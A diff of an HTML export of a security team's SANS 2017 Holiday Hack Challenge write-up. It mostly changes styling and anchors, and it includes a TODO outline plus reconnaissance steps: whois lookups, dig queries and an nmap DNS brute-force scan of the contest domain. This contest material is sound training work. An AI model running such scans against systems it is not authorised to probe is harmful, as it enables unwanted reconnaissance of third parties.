@@ -3,29 +3,22 @@
 "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
 <head>
-<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>SANS 2017 Holiday Hack Writeup</title>
-<meta name="generator" content="Org mode" />
-<meta name="author" content="Vlad Grigorescu" />
+<meta  http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta  name="generator" content="Org-mode" />
+<meta  name="author" content="Vlad Grigorescu" />
 <style type="text/css">
  <!--/*--><![CDATA[/*><!--*/
-  .title  { text-align: center;
-             margin-bottom: .2em; }
-  .subtitle { text-align: center;
-              font-size: medium;
-              font-weight: bold;
-              margin-top:0; }
+  .title  { text-align: center; }
   .todo   { font-family: monospace; color: red; }
-  .done   { font-family: monospace; color: green; }
-  .priority { font-family: monospace; color: orange; }
+  .done   { color: green; }
   .tag    { background-color: #eee; font-family: monospace;
             padding: 2px; font-size: 80%; font-weight: normal; }
   .timestamp { color: #bebebe; }
   .timestamp-kwd { color: #5f9ea0; }
-  .org-right  { margin-left: auto; margin-right: 0px;  text-align: right; }
-  .org-left   { margin-left: 0px;  margin-right: auto; text-align: left; }
-  .org-center { margin-left: auto; margin-right: auto; text-align: center; }
+  .right  { margin-left: auto; margin-right: 0px;  text-align: right; }
+  .left   { margin-left: 0px;  margin-right: auto; text-align: left; }
+  .center { margin-left: auto; margin-right: auto; text-align: center; }
   .underline { text-decoration: underline; }
   #postamble p, #preamble p { font-size: 90%; margin: .2em; }
   p.verse { margin-left: 3%; }
@@ -52,111 +45,27 @@
     border: 1px solid black;
   }
   pre.src:hover:before { display: inline;}
-  /* Languages per Org manual */
-  pre.src-asymptote:before { content: 'Asymptote'; }
-  pre.src-awk:before { content: 'Awk'; }
-  pre.src-C:before { content: 'C'; }
-  /* pre.src-C++ doesn't work in CSS */
-  pre.src-clojure:before { content: 'Clojure'; }
-  pre.src-css:before { content: 'CSS'; }
-  pre.src-D:before { content: 'D'; }
-  pre.src-ditaa:before { content: 'ditaa'; }
-  pre.src-dot:before { content: 'Graphviz'; }
-  pre.src-calc:before { content: 'Emacs Calc'; }
+  pre.src-sh:before    { content: 'sh'; }
+  pre.src-bash:before  { content: 'sh'; }
   pre.src-emacs-lisp:before { content: 'Emacs Lisp'; }
-  pre.src-fortran:before { content: 'Fortran'; }
-  pre.src-gnuplot:before { content: 'gnuplot'; }
-  pre.src-haskell:before { content: 'Haskell'; }
-  pre.src-hledger:before { content: 'hledger'; }
-  pre.src-java:before { content: 'Java'; }
-  pre.src-js:before { content: 'Javascript'; }
-  pre.src-latex:before { content: 'LaTeX'; }
-  pre.src-ledger:before { content: 'Ledger'; }
-  pre.src-lisp:before { content: 'Lisp'; }
-  pre.src-lilypond:before { content: 'Lilypond'; }
-  pre.src-lua:before { content: 'Lua'; }
-  pre.src-matlab:before { content: 'MATLAB'; }
-  pre.src-mscgen:before { content: 'Mscgen'; }
-  pre.src-ocaml:before { content: 'Objective Caml'; }
-  pre.src-octave:before { content: 'Octave'; }
-  pre.src-org:before { content: 'Org mode'; }
-  pre.src-oz:before { content: 'OZ'; }
-  pre.src-plantuml:before { content: 'Plantuml'; }
-  pre.src-processing:before { content: 'Processing.js'; }
-  pre.src-python:before { content: 'Python'; }
-  pre.src-R:before { content: 'R'; }
-  pre.src-ruby:before { content: 'Ruby'; }
-  pre.src-sass:before { content: 'Sass'; }
-  pre.src-scheme:before { content: 'Scheme'; }
-  pre.src-screen:before { content: 'Gnu Screen'; }
-  pre.src-sed:before { content: 'Sed'; }
-  pre.src-sh:before { content: 'shell'; }
-  pre.src-sql:before { content: 'SQL'; }
-  pre.src-sqlite:before { content: 'SQLite'; }
-  /* additional languages in org.el's org-babel-load-languages alist */
-  pre.src-forth:before { content: 'Forth'; }
-  pre.src-io:before { content: 'IO'; }
-  pre.src-J:before { content: 'J'; }
-  pre.src-makefile:before { content: 'Makefile'; }
-  pre.src-maxima:before { content: 'Maxima'; }
-  pre.src-perl:before { content: 'Perl'; }
-  pre.src-picolisp:before { content: 'Pico Lisp'; }
-  pre.src-scala:before { content: 'Scala'; }
-  pre.src-shell:before { content: 'Shell Script'; }
-  pre.src-ebnf2ps:before { content: 'ebfn2ps'; }
-  /* additional language identifiers per "defun org-babel-execute"
-       in ob-*.el */
-  pre.src-cpp:before  { content: 'C++'; }
-  pre.src-abc:before  { content: 'ABC'; }
-  pre.src-coq:before  { content: 'Coq'; }
-  pre.src-groovy:before  { content: 'Groovy'; }
-  /* additional language identifiers from org-babel-shell-names in
-     ob-shell.el: ob-shell is the only babel language using a lambda to put
-     the execution function name together. */
-  pre.src-bash:before  { content: 'bash'; }
-  pre.src-csh:before  { content: 'csh'; }
-  pre.src-ash:before  { content: 'ash'; }
-  pre.src-dash:before  { content: 'dash'; }
-  pre.src-ksh:before  { content: 'ksh'; }
-  pre.src-mksh:before  { content: 'mksh'; }
-  pre.src-posh:before  { content: 'posh'; }
-  /* Additional Emacs modes also supported by the LaTeX listings package */
-  pre.src-ada:before { content: 'Ada'; }
-  pre.src-asm:before { content: 'Assembler'; }
-  pre.src-caml:before { content: 'Caml'; }
-  pre.src-delphi:before { content: 'Delphi'; }
-  pre.src-html:before { content: 'HTML'; }
-  pre.src-idl:before { content: 'IDL'; }
-  pre.src-mercury:before { content: 'Mercury'; }
-  pre.src-metapost:before { content: 'MetaPost'; }
-  pre.src-modula-2:before { content: 'Modula-2'; }
-  pre.src-pascal:before { content: 'Pascal'; }
-  pre.src-ps:before { content: 'PostScript'; }
-  pre.src-prolog:before { content: 'Prolog'; }
-  pre.src-simula:before { content: 'Simula'; }
-  pre.src-tcl:before { content: 'tcl'; }
-  pre.src-tex:before { content: 'TeX'; }
-  pre.src-plain-tex:before { content: 'Plain TeX'; }
-  pre.src-verilog:before { content: 'Verilog'; }
-  pre.src-vhdl:before { content: 'VHDL'; }
-  pre.src-xml:before { content: 'XML'; }
-  pre.src-nxml:before { content: 'XML'; }
-  /* add a generic configuration mode; LaTeX export needs an additional
-     (add-to-list 'org-latex-listings-langs '(conf " ")) in .emacs */
-  pre.src-conf:before { content: 'Configuration File'; }
+  pre.src-R:before     { content: 'R'; }
+  pre.src-perl:before  { content: 'Perl'; }
+  pre.src-java:before  { content: 'Java'; }
+  pre.src-sql:before   { content: 'SQL'; }
 
   table { border-collapse:collapse; }
   caption.t-above { caption-side: top; }
   caption.t-bottom { caption-side: bottom; }
   td, th { vertical-align:top;  }
-  th.org-right  { text-align: center;  }
-  th.org-left   { text-align: center;   }
-  th.org-center { text-align: center; }
-  td.org-right  { text-align: right;  }
-  td.org-left   { text-align: left;   }
-  td.org-center { text-align: center; }
+  th.right  { text-align: center;  }
+  th.left   { text-align: center;   }
+  th.center { text-align: center; }
+  td.right  { text-align: right;  }
+  td.left   { text-align: left;   }
+  td.center { text-align: center; }
   dt { font-weight: bold; }
-  .footpara { display: inline; }
+  .footpara:nth-child(2) { display: inline; }
+  .footpara { display: block; }
   .footdef  { margin-bottom: 1em; }
   .figure { padding: 1em; }
   .figure p { text-align: center; }
@@ -176,7 +85,6 @@
     { font-size: 10px; font-weight: bold; white-space: nowrap; }
   .org-info-js_search-highlight
     { background-color: #ffff00; color: #000000; font-weight: bold; }
-  .org-svg { width: 90%; }
   /*]]>*/-->
 </style>
 <link rel="stylesheet" type="text/css" href="http://www.pirilampo.org/styles/readtheorg/css/htmlize.css"/>
@@ -190,7 +98,7 @@
 @licstart  The following is the entire license notice for the
 JavaScript code in this tag.
 
-Copyright (C) 2012-2017 Free Software Foundation, Inc.
+Copyright (C) 2012-2013 Free Software Foundation, Inc.
 
 The JavaScript code in this tag is free software: you can
 redistribute it and/or modify it under the terms of the GNU
@@ -231,28 +139,48 @@ for the JavaScript code in this tag.
  }
 /*]]>*///-->
 </script>
-<script type="text/x-mathjax-config">
+<script type="text/javascript" src="http://orgmode.org/mathjax/MathJax.js"></script>
+<script type="text/javascript">
+<!--/*--><![CDATA[/*><!--*/
     MathJax.Hub.Config({
+        // Only one of the two following lines, depending on user settings
+        // First allows browser-native MathML display, second forces HTML/CSS
+        //  config: ["MMLorHTML.js"], jax: ["input/TeX"],
+            jax: ["input/TeX", "output/HTML-CSS"],
+        extensions: ["tex2jax.js","TeX/AMSmath.js","TeX/AMSsymbols.js",
+                     "TeX/noUndefined.js"],
+        tex2jax: {
+            inlineMath: [ ["\\(","\\)"] ],
+            displayMath: [ ['$$','$$'], ["\\[","\\]"], ["\\begin{displaymath}","\\end{displaymath}"] ],
+            skipTags: ["script","noscript","style","textarea","pre","code"],
+            ignoreClass: "tex2jax_ignore",
+            processEscapes: false,
+            processEnvironments: true,
+            preview: "TeX"
+        },
+        showProcessingMessages: true,
         displayAlign: "center",
-        displayIndent: "0em",
+        displayIndent: "2em",
 
-        "HTML-CSS": { scale: 100,
-                        linebreaks: { automatic: "false" },
-                        webFont: "TeX"
-                       },
-        SVG: {scale: 100,
-              linebreaks: { automatic: "false" },
-              font: "TeX"},
-        NativeMML: {scale: 100},
-        TeX: { equationNumbers: {autoNumber: "AMS"},
-               MultLineWidth: "85%",
-               TagSide: "right",
-               TagIndent: ".8em"
+        "HTML-CSS": {
+             scale: 100,
+             availableFonts: ["STIX","TeX"],
+             preferredFont: "TeX",
+             webFont: "TeX",
+             imageFont: "TeX",
+             showMathMenu: true,
+        },
+        MMLorHTML: {
+             prefer: {
+                 MSIE:    "MML",
+                 Firefox: "MML",
+                 Opera:   "HTML",
+                 other:   "HTML"
              }
-});
+        }
+    });
+/*]]>*///-->
 </script>
-<script type="text/javascript"
-        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS_HTML"></script>
 </head>
 <body>
 <div id="content">
@@ -261,154 +189,178 @@ for the JavaScript code in this tag.
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents">
 <ul>
-<li><a href="#org2c56b36"><span class="todo TODO">TODO</span> </a>
+<li><a href="#sec-1"><span class="todo TODO">TODO</span> </a>
 <ul>
-<li><a href="#orgfaa4938">Overall approach</a></li>
-<li><a href="#org685e20a">Introduction</a></li>
-<li><a href="#org49e87e5">Answers</a></li>
-<li><a href="#org4e9cdb5">Pre-contest Reconnaissance</a></li>
-<li><a href="#org8354cdf">Terminals and Servers</a></li>
-<li><a href="#orga8e2579">Easter Eggs</a></li>
-<li><a href="#org74a3cd5">Snowball Game</a></li>
+<li><a href="#sec-1-1">Overall approach</a></li>
+<li><a href="#sec-1-2">Introduction</a></li>
+<li><a href="#sec-1-3">Answers</a></li>
+<li><a href="#sec-1-4">Pre-contest Reconnaissance</a></li>
+<li><a href="#sec-1-5">Terminals and Servers</a></li>
+<li><a href="#sec-1-6">Easter Eggs</a></li>
+<li><a href="#sec-1-7">Snowball Game</a></li>
 </ul>
 </li>
-<li><a href="#org494e540">Introduction</a></li>
-<li><a href="#org5e9887d">tl;dr: Quick Answers</a></li>
-<li><a href="#org029804f">Pre-contest Reconnaissance</a>
+<li><a href="#sec-2">Introduction</a></li>
+<li><a href="#sec-3">tl;dr: Quick Answers</a></li>
+<li><a href="#sec-4">Pre-contest Reconnaissance</a>
 <ul>
-<li><a href="#orge15bb75">Whois Searching</a></li>
-<li><a href="#org669c156">DNS Brute Forcing</a></li>
-<li><a href="#org125f28f">Certificate Transparency Logs</a></li>
-<li><a href="#org2591284">Monitoring</a></li>
-<li><a href="#org7e02a0d">Recon Summary</a></li>
+<li><a href="#sec-4-1">Whois Searching</a></li>
+<li><a href="#sec-4-2">DNS Brute Forcing</a></li>
+<li><a href="#sec-4-3">Certificate Transparency Logs</a></li>
+<li><a href="#sec-4-4">Monitoring</a></li>
+<li><a href="#sec-4-5">Recon Summary</a></li>
 </ul>
 </li>
-<li><a href="#org1bf9e8a">Terminals</a>
+<li><a href="#sec-5">Terminals</a>
 <ul>
-<li><a href="#org1688e9e">Bumble's Bounce</a></li>
-<li><a href="#org8dd3295">Cryokinetic Magic</a></li>
-<li><a href="#org8fcc336">I Don't Think We're In Kansas Anymore</a></li>
-<li><a href="#org16b135d">Oh Wait Maybe We Are</a></li>
-<li><a href="#orgf22753e">There's No Place Like Home</a></li>
-<li><a href="#org401e86b">We're Off To See The</a></li>
-<li><a href="#org704bdc4">Winconceivable The Cliffs Of Insanity</a></li>
-<li><a href="#org2f7febe">Winter Wonder Landing</a></li>
+<li><a href="#sec-5-1">Bumble's Bounce</a></li>
+<li><a href="#sec-5-2">Cryokinetic Magic</a></li>
+<li><a href="#sec-5-3">I Don't Think We're In Kansas Anymore</a></li>
+<li><a href="#sec-5-4">Oh Wait Maybe We Are</a></li>
+<li><a href="#sec-5-5">There's No Place Like Home</a></li>
+<li><a href="#sec-5-6">We're Off To See The</a></li>
+<li><a href="#sec-5-7">Winconceivable The Cliffs Of Insanity</a></li>
+<li><a href="#sec-5-8">Winter Wonder Landing</a></li>
 </ul>
 </li>
-<li><a href="#org9ea9753">Answers</a>
+<li><a href="#sec-6">Answers</a>
 <ul>
-<li><a href="#orgf47e261">Question 1</a></li>
-<li><a href="#org5ab4121">Question 2</a></li>
-<li><a href="#org43ed5d1">Question 3</a></li>
-<li><a href="#org3f356a0">Question 4</a></li>
-<li><a href="#org3bbdc4a">Question 5</a></li>
-<li><a href="#org0c39089">Question 6</a></li>
-<li><a href="#orgb4b3f6f">Question 7</a></li>
-<li><a href="#org877a271">Question 8</a></li>
-<li><a href="#org3f0fba9">Question 9</a></li>
+<li><a href="#sec-6-1">Question 1</a></li>
+<li><a href="#sec-6-2">Question 2</a></li>
+<li><a href="#sec-6-3">Question 3</a></li>
+<li><a href="#sec-6-4">Question 4</a></li>
+<li><a href="#sec-6-5">Question 5</a></li>
+<li><a href="#sec-6-6">Question 6</a></li>
+<li><a href="#sec-6-7">Question 7</a></li>
+<li><a href="#sec-6-8">Question 8</a></li>
+<li><a href="#sec-6-9">Question 9</a></li>
 </ul>
 </li>
-<li><a href="#org2a30f35">Misc/TODO</a>
+<li><a href="#sec-7">Easter Eggs</a></li>
+<li><a href="#sec-8">Misc/TODO</a>
 <ul>
-<li><a href="#org735e341">Let the Hack Begin!</a></li>
-<li><a href="#org1d65fe1">Using ripgrep</a></li>
+<li><a href="#sec-8-1">Let the Hack Begin!</a></li>
+<li><a href="#sec-8-2">Using ripgrep</a></li>
 </ul>
 </li>
 </ul>
 </div>
 </div>
 
-<div id="outline-container-org2c56b36" class="outline-2">
-<h2 id="org2c56b36"><span class="todo TODO">TODO</span> </h2>
-<div class="outline-text-2" id="text-org2c56b36">
-</div>
-<div id="outline-container-orgfaa4938" class="outline-3">
-<h3 id="orgfaa4938">Overall approach</h3>
-<div class="outline-text-3" id="text-orgfaa4938">
+<div id="outline-container-sec-1" class="outline-2">
+<h2 id="sec-1"><span class="todo TODO">TODO</span> </h2>
+<div class="outline-text-2" id="text-1">
+</div><div id="outline-container-sec-1-1" class="outline-3">
+<h3 id="sec-1-1">Overall approach</h3>
+<div class="outline-text-3" id="text-1-1">
 <p>
 Each question should have:
 </p>
 <ul class="org-ul">
-<li class="off"><code>[&#xa0;]</code> A reference solution</li>
-<li class="off"><code>[&#xa0;]</code> An overview of the thought process and what we tried that led to that solution, <b>and what we tried that didn't work</b></li>
-<li class="off"><code>[&#xa0;]</code> Some other ways that we could've solved it</li>
-<li class="off"><code>[&#xa0;]</code> A peak behind the curtain of how the challenge worked, and perhaps a better defense that would've mitigated the attack</li>
+<li><code>[&#xa0;]</code> A reference solution
+</li>
+<li><code>[&#xa0;]</code> An overview of the thought process and what we tried that led to that solution, <b>and what we tried that didn't work</b>
+</li>
+<li><code>[&#xa0;]</code> Some other ways that we could've solved it
+</li>
+<li><code>[&#xa0;]</code> A peak behind the curtain of how the challenge worked, and perhaps a better defense that would've mitigated the attack
+</li>
 </ul>
 </div>
 </div>
-<div id="outline-container-org685e20a" class="outline-3">
-<h3 id="org685e20a">Introduction</h3>
-<div class="outline-text-3" id="text-org685e20a">
+<div id="outline-container-sec-1-2" class="outline-3">
+<h3 id="sec-1-2">Introduction</h3>
+<div class="outline-text-3" id="text-1-2">
 <ul class="org-ul">
-<li class="off"><code>[&#xa0;]</code> Write a paragraph about our approach to the challenge, what everyone did, etc.</li>
-<li class="off"><code>[&#xa0;]</code> Write a paragraph about the outline and presentation of the report ("We first lay out the solutions, then we show some other ways that we solved it, then we try to peak behind the curtain of how the challenges worked&#x2026;")</li>
+<li><code>[&#xa0;]</code> Write a paragraph about our approach to the challenge, what everyone did, etc.
+</li>
+<li><code>[&#xa0;]</code> Write a paragraph about the outline and presentation of the report ("We first lay out the solutions, then we show some other ways that we solved it, then we try to peak behind the curtain of how the challenges worked&#x2026;")
+</li>
 </ul>
 </div>
 </div>
-<div id="outline-container-org49e87e5" class="outline-3">
-<h3 id="org49e87e5">Answers</h3>
-<div class="outline-text-3" id="text-org49e87e5">
+<div id="outline-container-sec-1-3" class="outline-3">
+<h3 id="sec-1-3">Answers</h3>
+<div class="outline-text-3" id="text-1-3">
 <ul class="org-ul">
-<li class="off"><code>[&#xa0;]</code> Write short answers to each of the questions</li>
-<li class="off"><code>[&#xa0;]</code> Link to where they can read more about the answers (maybe link to the "reference solution," and the "going further solution" for each)</li>
+<li><code>[&#xa0;]</code> Write short answers to each of the questions
+</li>
+<li><code>[&#xa0;]</code> Link to where they can read more about the answers (maybe link to the "reference solution," and the "going further solution" for each)
+</li>
 </ul>
 </div>
 </div>
-<div id="outline-container-org4e9cdb5" class="outline-3">
-<h3 id="org4e9cdb5">Pre-contest Reconnaissance</h3>
-<div class="outline-text-3" id="text-org4e9cdb5">
+<div id="outline-container-sec-1-4" class="outline-3">
+<h3 id="sec-1-4">Pre-contest Reconnaissance</h3>
+<div class="outline-text-3" id="text-1-4">
 <ul class="org-ul">
-<li class="off"><code>[&#xa0;]</code> Update the recon to talk about the changes that they made (hid some stuff in DNS, etc.)</li>
+<li><code>[&#xa0;]</code> Update the recon to talk about the changes that they made (hid some stuff in DNS, etc.)
+</li>
 </ul>
 </div>
 </div>
-<div id="outline-container-org8354cdf" class="outline-3">
-<h3 id="org8354cdf">Terminals and Servers</h3>
-<div class="outline-text-3" id="text-org8354cdf">
+<div id="outline-container-sec-1-5" class="outline-3">
+<h3 id="sec-1-5">Terminals and Servers</h3>
+<div class="outline-text-3" id="text-1-5">
 <ul class="org-ul">
-<li class="off"><code>[&#xa0;]</code> Reference solutions for solving each challenge</li>
-<li class="off"><code>[&#xa0;]</code> Thought process for solving each challenge</li>
-<li class="off"><code>[&#xa0;]</code> Alternative ways to solve each challenge
+<li><code>[&#xa0;]</code> Reference solutions for solving each challenge
+</li>
+<li><code>[&#xa0;]</code> Thought process for solving each challenge
+</li>
+<li><code>[&#xa0;]</code> Alternative ways to solve each challenge
 <ul class="org-ul">
-<li class="off"><code>[&#xa0;]</code> EWA Server: Downloaded all the e-mails</li>
-<li class="off"><code>[&#xa0;]</code> EMI Server: Got Meterpreter working</li>
-<li class="off"><code>[&#xa0;]</code> Terminals: Reverse the binaries?</li>
-</ul></li>
-<li class="off"><code>[&#xa0;]</code> Discuss how each challenge was setup
+<li><code>[&#xa0;]</code> EWA Server: Downloaded all the e-mails
+</li>
+<li><code>[&#xa0;]</code> EMI Server: Got Meterpreter working
+</li>
+<li><code>[&#xa0;]</code> Terminals: Reverse the binaries?
+</li>
+</ul>
+</li>
+<li><code>[&#xa0;]</code> Discuss how each challenge was setup
 <ul class="org-ul">
-<li class="off"><code>[&#xa0;]</code> EMI Server: Discuss the alabaster_snowball.py Python script</li>
-</ul></li>
-<li class="off"><code>[&#xa0;]</code> AsciiCinema solution to each terminal?</li>
+<li><code>[&#xa0;]</code> EMI Server: Discuss the alabaster_snowball.py Python script
+</li>
+</ul>
+</li>
+<li><code>[&#xa0;]</code> AsciiCinema solution to each terminal?
+</li>
 </ul>
 </div>
 </div>
-<div id="outline-container-orga8e2579" class="outline-3">
-<h3 id="orga8e2579">Easter Eggs</h3>
-<div class="outline-text-3" id="text-orga8e2579">
+<div id="outline-container-sec-1-6" class="outline-3">
+<h3 id="sec-1-6">Easter Eggs</h3>
+<div class="outline-text-3" id="text-1-6">
 <ul class="org-ul">
-<li class="off"><code>[&#xa0;]</code> List references and any hidden data we found
+<li><code>[&#xa0;]</code> List references and any hidden data we found
 <ul class="org-ul">
-<li class="off"><code>[&#xa0;]</code> The example Hash</li>
-<li class="off"><code>[&#xa0;]</code> nppd robots.txt</li>
-<li class="off"><code>[&#xa0;]</code> LDAP passwords</li>
-</ul></li>
+<li><code>[&#xa0;]</code> The example Hash
+</li>
+<li><code>[&#xa0;]</code> nppd robots.txt
+</li>
+<li><code>[&#xa0;]</code> LDAP passwords
+</li>
+</ul>
+</li>
 </ul>
 </div>
 </div>
-<div id="outline-container-org74a3cd5" class="outline-3">
-<h3 id="org74a3cd5">Snowball Game</h3>
-<div class="outline-text-3" id="text-org74a3cd5">
+<div id="outline-container-sec-1-7" class="outline-3">
+<h3 id="sec-1-7">Snowball Game</h3>
+<div class="outline-text-3" id="text-1-7">
 <ul class="org-ul">
-<li class="off"><code>[&#xa0;]</code> Videos to solving each level?</li>
-<li class="off"><code>[&#xa0;]</code> Hacking the game?</li>
+<li><code>[&#xa0;]</code> Videos to solving each level?
+</li>
+<li><code>[&#xa0;]</code> Hacking the game?
+</li>
 </ul>
 </div>
 </div>
 </div>
 
-<div id="outline-container-org494e540" class="outline-2">
-<h2 id="org494e540">Introduction</h2>
-<div class="outline-text-2" id="text-org494e540">
+<div id="outline-container-sec-2" class="outline-2">
+<h2 id="sec-2">Introduction</h2>
+<div class="outline-text-2" id="text-2">
 <p>
 We're the Security team at the National Center for Supercomputing
 Applications, and we worked together on yet another fun SANS Holiday
@@ -440,17 +392,17 @@ would've been more secure.
 </p>
 </div>
 </div>
-<div id="outline-container-org5e9887d" class="outline-2">
-<h2 id="org5e9887d">tl;dr: Quick Answers</h2>
+<div id="outline-container-sec-3" class="outline-2">
+<h2 id="sec-3">tl;dr: Quick Answers</h2>
 </div>
-<div id="outline-container-org029804f" class="outline-2">
-<h2 id="org029804f">Pre-contest Reconnaissance</h2>
-<div class="outline-text-2" id="text-org029804f">
+<div id="outline-container-sec-4" class="outline-2">
+<h2 id="sec-4">Pre-contest Reconnaissance</h2>
+<div class="outline-text-2" id="text-4">
 
 <div class="figure">
 <p><img src="./images/sans_holiday_hack_preview.png" alt="sans_holiday_hack_preview.png" />
 </p>
-<p><span class="figure-number">Figure 1: </span>SANS Holiday Hack Challenge December 5th Update</p>
+<p><span class="figure-number">Figure 1:</span> SANS Holiday Hack Challenge December 5th Update</p>
 </div>
 
 <p>
@@ -478,9 +430,9 @@ some clues.
 </p>
 </div>
 
-<div id="outline-container-orge15bb75" class="outline-3">
-<h3 id="orge15bb75">Whois Searching</h3>
-<div class="outline-text-3" id="text-orge15bb75">
+<div id="outline-container-sec-4-1" class="outline-3">
+<h3 id="sec-4-1">Whois Searching</h3>
+<div class="outline-text-3" id="text-4-1">
 <p>
 For example, the 2016 contest made use of the domain
 www.northpolewonderland.com. We can look at publicly available WHOIS
@@ -488,6 +440,7 @@ data for that domain:
 </p>
 
 <div class="org-src-container">
+
 <pre class="src src-sh">whois northpolewonderland.com | grep Registrant
 </pre>
 </div>
@@ -518,114 +471,114 @@ info:
 
 
 <colgroup>
-<col  class="org-left" />
+<col  class="left" />
 
-<col  class="org-right" />
+<col  class="right" />
 
-<col  class="org-left" />
+<col  class="left" />
 </colgroup>
 <thead>
 <tr>
-<th scope="col" class="org-left">Domain Name</th>
-<th scope="col" class="org-right">Creation Date</th>
-<th scope="col" class="org-left">Registrar</th>
+<th scope="col" class="left">Domain Name</th>
+<th scope="col" class="right">Creation Date</th>
+<th scope="col" class="left">Registrar</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td class="org-left">northpolechristmastown.com</td>
-<td class="org-right">2017-10-19</td>
-<td class="org-left">GODADDY.COM, LLC</td>
+<td class="left">northpolechristmastown.com</td>
+<td class="right">2017-10-19</td>
+<td class="left">GODADDY.COM, LLC</td>
 </tr>
 
 <tr>
-<td class="org-left">1hrctf.com</td>
-<td class="org-right">2016-04-08</td>
-<td class="org-left">GODADDY.COM, LLC</td>
+<td class="left">1hrctf.com</td>
+<td class="right">2016-04-08</td>
+<td class="left">GODADDY.COM, LLC</td>
 </tr>
 
 <tr>
-<td class="org-left">1hrctf.org</td>
-<td class="org-right">2016-04-08</td>
-<td class="org-left">GODADDY.COM, LLC</td>
+<td class="left">1hrctf.org</td>
+<td class="right">2016-04-08</td>
+<td class="left">GODADDY.COM, LLC</td>
 </tr>
 
 <tr>
-<td class="org-left">cranbian.org</td>
-<td class="org-right">2016-11-22</td>
-<td class="org-left">GODADDY.COM, LLC</td>
+<td class="left">cranbian.org</td>
+<td class="right">2016-11-22</td>
+<td class="left">GODADDY.COM, LLC</td>
 </tr>
 
 <tr>
-<td class="org-left">hackfestchallenge.com</td>
-<td class="org-right">2016-10-20</td>
-<td class="org-left">GODADDY.COM, LLC</td>
+<td class="left">hackfestchallenge.com</td>
+<td class="right">2016-10-20</td>
+<td class="left">GODADDY.COM, LLC</td>
 </tr>
 
 <tr>
-<td class="org-left">onehourctf.org</td>
-<td class="org-right">2016-04-08</td>
-<td class="org-left">GODADDY.COM, LLC</td>
+<td class="left">onehourctf.org</td>
+<td class="right">2016-04-08</td>
+<td class="left">GODADDY.COM, LLC</td>
 </tr>
 
 <tr>
-<td class="org-left">atnascorp.com</td>
-<td class="org-right">2015-11-10</td>
-<td class="org-left">GODADDY.COM, LLC</td>
+<td class="left">atnascorp.com</td>
+<td class="right">2015-11-10</td>
+<td class="left">GODADDY.COM, LLC</td>
 </tr>
 
 <tr>
-<td class="org-left">ginormouselectronicssupplier.com</td>
-<td class="org-right">2015-12-09</td>
-<td class="org-left">GODADDY.COM, LLC</td>
+<td class="left">ginormouselectronicssupplier.com</td>
+<td class="right">2015-12-09</td>
+<td class="left">GODADDY.COM, LLC</td>
 </tr>
 
 <tr>
-<td class="org-left">holidayhackchallenge.com</td>
-<td class="org-right">2015-11-02</td>
-<td class="org-left">GODADDY.COM, LLC</td>
+<td class="left">holidayhackchallenge.com</td>
+<td class="right">2015-11-02</td>
+<td class="left">GODADDY.COM, LLC</td>
 </tr>
 
 <tr>
-<td class="org-left">holidayhackchallenge.org</td>
-<td class="org-right">2015-11-02</td>
-<td class="org-left">GODADDY.COM, LLC</td>
+<td class="left">holidayhackchallenge.org</td>
+<td class="right">2015-11-02</td>
+<td class="left">GODADDY.COM, LLC</td>
 </tr>
 
 <tr>
-<td class="org-left">digimeme.org</td>
-<td class="org-right">2013-11-18</td>
-<td class="org-left">GODADDY.COM, LLC</td>
+<td class="left">digimeme.org</td>
+<td class="right">2013-11-18</td>
+<td class="left">GODADDY.COM, LLC</td>
 </tr>
 
 <tr>
-<td class="org-left">syn-pi.org</td>
-<td class="org-right">2013-11-18</td>
-<td class="org-left">GODADDY.COM, LLC</td>
+<td class="left">syn-pi.org</td>
+<td class="right">2013-11-18</td>
+<td class="left">GODADDY.COM, LLC</td>
 </tr>
 
 <tr>
-<td class="org-left">pseudovision.net</td>
-<td class="org-right">2010-09-09</td>
-<td class="org-left">GODADDY.COM, LLC</td>
+<td class="left">pseudovision.net</td>
+<td class="right">2010-09-09</td>
+<td class="left">GODADDY.COM, LLC</td>
 </tr>
 
 <tr>
-<td class="org-left">counterhack.net</td>
-<td class="org-right">2001-06-22</td>
-<td class="org-left">NETWORK SOLUTIONS, LLC.</td>
+<td class="left">counterhack.net</td>
+<td class="right">2001-06-22</td>
+<td class="left">NETWORK SOLUTIONS, LLC.</td>
 </tr>
 
 <tr>
-<td class="org-left">skoudis.com</td>
-<td class="org-right">2001-06-22</td>
-<td class="org-left">NETWORK SOLUTIONS, LLC.</td>
+<td class="left">skoudis.com</td>
+<td class="right">2001-06-22</td>
+<td class="left">NETWORK SOLUTIONS, LLC.</td>
 </tr>
 
 <tr>
-<td class="org-left">counterhack.com</td>
-<td class="org-right">2000-05-30</td>
-<td class="org-left">GODADDY.COM, LLC</td>
+<td class="left">counterhack.com</td>
+<td class="right">2000-05-30</td>
+<td class="left">GODADDY.COM, LLC</td>
 </tr>
 </tbody>
 </table>
@@ -651,14 +604,15 @@ should be as unintrusive as possible.
 </div>
 </div>
 
-<div id="outline-container-org669c156" class="outline-3">
-<h3 id="org669c156">DNS Brute Forcing</h3>
-<div class="outline-text-3" id="text-org669c156">
+<div id="outline-container-sec-4-2" class="outline-3">
+<h3 id="sec-4-2">DNS Brute Forcing</h3>
+<div class="outline-text-3" id="text-4-2">
 <p>
 Now that we have a domain we're interested in, let's look at DNS:
 </p>
 
 <div class="org-src-container">
+
 <pre class="src src-sh">dig ANY northpolechristmastown.com
 </pre>
 </div>
@@ -715,7 +669,7 @@ Sand-Crawler-delay: 2187
 <div class="figure">
 <p><img src="./images/nppd_star.png" alt="nppd_star.png" />
 </p>
-<p><span class="figure-number">Figure 2: </span>North Pole Police Department Logo</p>
+<p><span class="figure-number">Figure 2:</span> North Pole Police Department Logo</p>
 </div>
 
 <p>
@@ -752,6 +706,7 @@ use an nmap script to try to query those:
 </p>
 
 <div class="org-src-container">
+
 <pre class="src src-sh">$ nmap --script dns-brute --script-args dns-brute.domain=northpolechristmastown.com,dns-brute.threads=1,dns-brute.hostlist=fuzzdb/discovery/dns/dnsmapCommonSubdomains.txt
 </pre>
 </div>
@@ -782,9 +737,9 @@ A couple of other lists resulted in the following hostnames as well:
 </div>
 </div>
 
-<div id="outline-container-org125f28f" class="outline-3">
